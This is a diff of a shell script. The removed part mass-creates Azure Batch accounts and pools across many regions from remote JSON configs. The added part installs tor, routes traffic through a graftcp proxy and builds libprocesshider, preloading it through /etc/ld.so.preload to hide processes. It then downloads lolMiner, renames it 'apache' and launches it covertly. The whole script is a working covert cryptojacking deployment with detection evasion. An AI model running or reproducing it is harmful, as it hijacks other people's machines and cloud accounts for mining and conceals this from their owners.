@@ -1,29 +1,37 @@
-#!/bin/bash
-sub="7c243722-cc41-4781-a9a3-f435eddc0ccd"
-ran=`head /dev/urandom | tr -dc a-z0-9 | fold -w 3 | head -n 1`
-wget -O batch.json https://raw.githubusercontent.com/siwo81/dev/main/batch.json
-wget -O batch2.json https://raw.githubusercontent.com/siwo81/dev/main/batch2.json
-az provider register --namespace Microsoft.Batch --subscription "$sub"
-az group create --name batchacc$ran --location westus2 --subscription "$sub"
-echo "sleep 15s..."
-sleep 15s
-nnn=`head /dev/urandom | tr -dc a-z0-9 | fold -w 14 | head -n 1`
-batch=0
-for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
-do
-	echo "Batch account creating...$region"
-	batch=$(( $batch + 1 ))
-	az batch account create --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --location $region --no-wait
-done
-echo "sleep 2m..."
-sleep 2m
-batch=0
-echo "Batch account setting..."
-for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
-do
-	batch=$(( $batch + 1 ))
-	az batch account login --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --shared-key-auth
-	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch.json
-	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch2.json
-done
-echo "Crotzz..."
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
+wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:9050
+socks5_username = 
+socks5_password = 
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
+
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz
+tar -xf lolMiner_v1.41b_Lin64.tar.gz
+cd 1.41b
+mv lolMiner ../apache
+cd ..
+
+screen ./graftcp/graftcp
